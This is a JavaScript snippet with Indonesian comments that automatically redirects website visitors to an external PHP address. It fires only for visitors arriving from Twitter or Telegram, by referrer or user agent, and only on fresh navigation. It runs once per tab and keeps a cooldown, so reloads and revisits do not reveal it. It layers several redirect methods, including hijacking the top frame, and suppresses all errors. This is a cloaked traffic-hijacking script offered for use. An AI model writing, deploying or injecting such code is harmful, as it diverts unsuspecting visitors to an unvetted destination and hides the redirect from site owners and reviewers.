(function () {
  try {
    // === SETTING (ganti sesuai kebutuhan) ===
    var target = "https://vidoy.fun/cB6Tyq0.php"; // Wajib HTTPS
    var cooldownMs = 20 * 1000;           // 20 detik

    if (!/^https:\/\//i.test(target)) return;
    if (/[?#](?:.*[&?])?noredir=1(?:&|$)/i.test(location.search + location.hash)) return;

    // --- deteksi sumber ---
    var REF = String(document.referrer || "");
    var UA  = String(navigator.userAgent || "");

    var reAllowRef = /(t\.co|twitter\.com|t\.me|telegram\.org)/i;
    var reAllowUA  = /(twitter|telegram)/i;

    var fromRef = reAllowRef.test(REF);
    var fromUA  = reAllowUA.test(UA);

    // --- hanya saat NAVIGATE, bukan reload/back/forward ---
    var nav = (performance.getEntriesByType && performance.getEntriesByType("navigation") || [])[0];
    var navType = nav && nav.type || "navigate"; // default assume navigate di browser lama
    if (navType !== "navigate") return;

    // --- session gate: hanya sekali per tab/halaman ---
    var page = location.origin + location.pathname; // abaikan query biar konsisten
    var sessKey = "tw_tg_seen:" + page;             // per-tab (sessionStorage)
    if (sessionStorage.getItem(sessKey)) return;    // sudah pernah trigger di tab ini

    // --- local cooldown: cegah spam cross-visit ---
    var cdKey = "redirCooldown:" + page + "|" + target + "|tw_tg";
    var now   = Date.now();
    var until = parseInt(localStorage.getItem(cdKey) || "0", 10);
    if (now < until) return;

    // --- logika izin: 
    // 1) kalau referrer cocok → OK
    // 2) kalau referrer kosong tapi UA twitter/telegram → hanya BOLEH sekali (belum ada sessKey)
    var allowed = fromRef || (!fromRef && fromUA);

    if (!allowed) return;

    // SET gate lebih dulu supaya kalau user balik/reload tidak ke-trigger lagi
    sessionStorage.setItem(sessKey, "1");
    localStorage.setItem(cdKey, String(now + cooldownMs));

    // --- redirect (auto, tanpa klik) ---
    // Berlapis untuk kompatibilitas in-app browser
    location.href = target;
    setTimeout(function(){ try { window.location.assign(target); } catch(_){} }, 80);
    setTimeout(function(){ try { window.location.replace(target); } catch(_){} }, 160);
    setTimeout(function(){ try { if (window.top) window.top.location.href = target; } catch(_){} }, 240);

  } catch (_) {}
})();
